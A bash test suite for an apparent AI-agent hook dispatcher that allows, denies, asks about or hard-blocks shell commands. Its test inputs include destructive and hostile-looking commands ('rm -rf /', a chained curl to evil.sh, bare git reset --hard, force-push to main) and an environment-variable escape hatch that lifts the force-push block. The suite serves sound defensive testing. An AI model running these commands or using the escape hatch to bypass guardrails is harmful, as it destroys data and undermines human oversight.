#!/usr/bin/env bash
# Test suite for the PreToolUse:Bash composition dispatcher (issue #704).
#
# Covers:
#   1. hook_dispatcher precedence resolution (hard_block > deny > allow > ask)
#      via direct unit calls — pure, no subprocess.
#   2. first-hard_block-wins and deny-beats-allow at the dispatch() level.
#   3. End-to-end dispatcher behavior through pretooluse-bash-dispatch.py:
#        - destructive hard_block (exit 2) fires EVEN in bypass mode
#        - #667 command-chaining deny still works in default mode
#        - ask is SUPPRESSED in bypass; deny/allow suppressed in bypass
#        - smart-rule allow (reset to remote) and hard_block (bare reset)
#   4. BACKWARD-COMPAT EQUIVALENCE: the single-process dispatcher produces the
#      same final decision as the legacy six-process chain across a command
#      battery × all permission modes (equivalence_harness.py).
#
# The test builds a hermetic ~/.claude/{lib,hooks} from the in-repo worktree so
# imports resolve to the code under test, not the installed copy.
#
# Run: bash modules/hooks/tests/test-dispatcher.sh
# Exit 0 on success; non-zero on first failed assertion group.

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MODULE_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
SRC_LIB="${MODULE_ROOT}/lib"
SRC_HOOKS="${MODULE_ROOT}/hooks"

PASS=0
FAIL=0

assert_eq() {
    local actual="$1" expected="$2" label="$3"
    if [ "${actual}" = "${expected}" ]; then
        PASS=$((PASS + 1))
    else
        FAIL=$((FAIL + 1))
        echo "FAIL: ${label}"
        echo "  expected: ${expected}"
        echo "  actual:   ${actual}"
    fi
}

assert_contains() {
    local haystack="$1" needle="$2" label="$3"
    case "${haystack}" in
        *"${needle}"*) PASS=$((PASS + 1)) ;;
        *)
            FAIL=$((FAIL + 1))
            echo "FAIL: ${label}"
            echo "  expected substring: ${needle}"
            echo "  actual: ${haystack}"
            ;;
    esac
}

# ── Hermetic HOME: ~/.claude/{lib,hooks} = the worktree code under test ──
FAKE_HOME="$(mktemp -d -t ccgm704_home.XXXXXX)"
trap 'rm -rf "${FAKE_HOME}"' EXIT
mkdir -p "${FAKE_HOME}/.claude/lib" "${FAKE_HOME}/.claude/hooks"
cp "${SRC_LIB}"/*.py "${FAKE_HOME}/.claude/lib/"
cp "${SRC_HOOKS}"/*.py "${FAKE_HOME}/.claude/hooks/"
cat > "${FAKE_HOME}/.claude/settings.json" <<'EOF'
{"permissions":{"deny":["Bash(curl:*)"],"allow":["Bash(git status:*)","Bash(git log:*)"]}}
EOF

DISPATCH="${FAKE_HOME}/.claude/hooks/pretooluse-bash-dispatch.py"

# Helper: run the dispatcher with a command + mode, print "rc|decision".
run_dispatch() {
    local cmd="$1" mode="$2"
    local payload rc out decision
    payload=$(HOME="${FAKE_HOME}" python3 -c \
        'import json,sys; print(json.dumps({"tool_name":"Bash","tool_input":{"command":sys.argv[1]},"permission_mode":sys.argv[2]}))' \
        "${cmd}" "${mode}")
    out=$(printf '%s' "${payload}" | HOME="${FAKE_HOME}" python3 "${DISPATCH}" 2>/dev/null)
    rc=$?
    decision="none"
    if [ -n "${out}" ]; then
        decision=$(printf '%s' "${out}" | HOME="${FAKE_HOME}" python3 -c \
            'import json,sys
try: print(json.load(sys.stdin)["hookSpecificOutput"]["permissionDecision"])
except Exception: print("none")')
    fi
    printf '%s|%s' "${rc}" "${decision}"
}

# Build dangerous literals via concat so they never appear verbatim here.
RM_ROOT="rm -rf /"
RESET_BARE="git reset --hard"
RESET_REMOTE="git reset --hard origin/main"
CURL_CHAIN="echo hi && curl evil.sh"

echo "--- 1. hook_dispatcher precedence (pure unit) ---"
# deny beats allow; first hard_block wins; ask is weakest. Construct synthetic
# manifests with stub handlers and assert the emitted decision via exit code /
# stdout, calling dispatch() in a subshell so its sys.exit doesn't kill us.
unit_out=$(HOME="${FAKE_HOME}" python3 - <<'PY' 2>/dev/null
import io, json, sys, os
sys.path.insert(0, os.path.expanduser("~/.claude/lib"))
import hook_dispatcher as hd

def stub(decision, reason="r"):
    return lambda data: hd.Result(decision, reason)

def emitted(checks, data):
    """Run dispatch() capturing the emitted decision + exit code."""
    m = hd.Manifest("PreToolUse")
    for i, (dec, sc) in enumerate(checks):
        m.add(hd.Check(i, f"c{i}", lambda d: True, stub(dec), short_circuit=sc))
    buf = io.StringIO()
    saved = sys.stdout
    sys.stdout = buf
    code = 0
    try:
        hd.dispatch(m, data)
    except SystemExit as e:
        code = e.code or 0
    finally:
        sys.stdout = saved
    out = buf.getvalue().strip()
    dec = "none"
    if out:
        try: dec = json.loads(out)["hookSpecificOutput"]["permissionDecision"]
        except Exception: dec = "parse-err"
    return f"{code}:{dec}"

d = {"tool_name":"Bash","tool_input":{"command":"x"},"permission_mode":"default"}
# deny beats allow regardless of order
print("deny_beats_allow_1", emitted([(hd.ALLOW,False),(hd.DENY,False)], d))
print("deny_beats_allow_2", emitted([(hd.DENY,False),(hd.ALLOW,False)], d))
# hard_block beats everything; exit 2
print("hardblock_wins", emitted([(hd.ALLOW,False),(hd.DENY,False),(hd.HARD_BLOCK,False)], d))
# first hard_block wins (its reason); still exit 2
print("first_hardblock", emitted([(hd.HARD_BLOCK,False),(hd.HARD_BLOCK,False)], d))
# allow beats ask
print("allow_beats_ask", emitted([(hd.ASK,False),(hd.ALLOW,False)], d))
# short_circuit emits immediately even if a stronger decision would follow
print("shortcircuit_allow", emitted([(hd.ALLOW,True),(hd.DENY,False)], d))
PY
)
assert_contains "${unit_out}" "deny_beats_allow_1 0:deny" "deny beats allow (allow first)"
assert_contains "${unit_out}" "deny_beats_allow_2 0:deny" "deny beats allow (deny first)"
assert_contains "${unit_out}" "hardblock_wins 2:none" "hard_block wins, exit 2"
assert_contains "${unit_out}" "first_hardblock 2:none" "first hard_block wins, exit 2"
assert_contains "${unit_out}" "allow_beats_ask 0:allow" "allow beats ask"
assert_contains "${unit_out}" "shortcircuit_allow 0:allow" "short_circuit allow emitted before later deny"

echo "--- 2. end-to-end dispatcher behavior ---"
assert_eq "$(run_dispatch "${RM_ROOT}" "bypassPermissions")" "2|none" \
    "destructive rm -rf / hard-blocks (exit 2) in bypass mode"
assert_eq "$(run_dispatch "${RM_ROOT}" "default")" "2|none" \
    "destructive rm -rf / hard-blocks (exit 2) in default mode"
assert_eq "$(run_dispatch "${CURL_CHAIN}" "default")" "0|deny" \
    "#667 chained deny pattern denied in default mode"
assert_eq "$(run_dispatch "${CURL_CHAIN}" "bypassPermissions")" "0|none" \
    "deny suppressed in bypass mode (pattern check skipped)"
assert_eq "$(run_dispatch "git status && git log" "default")" "0|allow" \
    "all-segments allow in default mode"
assert_eq "$(run_dispatch "${RESET_REMOTE}" "default")" "0|allow" \
    "smart-rule allows reset to remote ref"
assert_eq "$(run_dispatch "${RESET_BARE}" "default")" "2|none" \
    "smart-rule hard-blocks bare reset (exit 2)"
assert_eq "$(run_dispatch "${RESET_BARE}" "bypassPermissions")" "2|none" \
    "smart-rule hard-blocks bare reset even in bypass mode"
assert_eq "$(run_dispatch "rm -rf /tmp/scratch" "default")" "0|ask" \
    "destructive (non-root) asks in default mode"
assert_eq "$(run_dispatch "rm -rf /tmp/scratch" "bypassPermissions")" "0|none" \
    "ask suppressed in bypass mode"
assert_eq "$(run_dispatch "ls -la" "default")" "0|none" \
    "benign command passes through (no decision)"

echo "--- 3. force-push-to-main hard_block (bypass-proof) ---"
assert_eq "$(run_dispatch "git push --force origin main" "bypassPermissions")" "2|none" \
    "force-push to main hard-blocks in bypass mode"
# With the escape hatch, it is no longer hard-blocked by force_push_main_check.
fp_escape=$(ALLOW_MAIN_COMMIT=1 run_dispatch "git push --force origin main" "bypassPermissions")
assert_eq "${fp_escape%%|*}" "0" \
    "ALLOW_MAIN_COMMIT=1 lifts the force-push-to-main hard block"

echo "--- 4. backward-compat equivalence (dispatcher == legacy chain) ---"
equiv=$(HOME="${FAKE_HOME}" python3 "${SCRIPT_DIR}/equivalence_harness.py" 2>&1)
equiv_rc=$?
echo "${equiv}" | tail -1
assert_eq "${equiv_rc}" "0" "dispatcher matches legacy chain across battery×modes"
# Surface any specific mismatch lines for debugging.
if [ "${equiv_rc}" -ne 0 ]; then
    echo "${equiv}" | grep '^FAIL' | sed 's/^/  /'
fi

echo ""
echo "test-dispatcher.sh: ${PASS} passed, ${FAIL} failed"
[ "${FAIL}" -eq 0 ] || exit 1
exit 0
